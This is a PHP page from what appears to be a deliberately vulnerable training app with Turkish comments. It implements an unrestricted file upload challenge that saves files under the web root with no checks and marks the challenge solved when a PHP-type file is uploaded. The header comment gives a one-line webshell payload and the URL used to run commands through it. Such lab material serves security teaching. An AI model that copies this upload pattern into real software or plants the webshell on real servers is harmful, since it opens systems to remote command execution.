<?php
/**
 * Unrestricted File Upload — LOW
 * KASITLI ZAFİYET: hiçbir kontrol yok; dosya docroot altına orijinal adıyla taşınır.
 * Sömürü: shell.php (<?php system($_GET['c']); ?>) yükle -> /hackable/uploads/shell.php?c=id
 */
$uploadDir = APP_ROOT . '/hackable/uploads/';
$webBase   = '/hackable/uploads/';

echo '<form method="post" enctype="multipart/form-data">';
echo '  Dosya seç: <input type="file" name="uploaded"> <button type="submit">Yükle</button>';
echo '</form>';

if (!empty($_FILES['uploaded']['name'])) {
    $name = basename($_FILES['uploaded']['name']);
    ids_log('file_upload', $name);
    $target = $uploadDir . $name;
    // ----- ZAFİYETLİ: kontrolsüz taşıma -----
    if (move_uploaded_file($_FILES['uploaded']['tmp_name'], $target)) {
        // ------------------------------------
        $url = $webBase . rawurlencode($name);
        echo '<div class="result">Yüklendi: <a href="' . e($url) . '">' . e($url) . '</a></div>';
        if (preg_match('/\.(php|phtml|pht|php5|phar)$/i', $name)) {
            mark_solved('file_upload');
            echo '<div class="result">✅ Çalıştırılabilir webshell yüklendi — challenge çözüldü! '
               . 'Dene: <code>' . e($url) . '?c=id</code></div>';
        }
    } else {
        echo '<div class="result detected">Yükleme başarısız.</div>';
    }
}
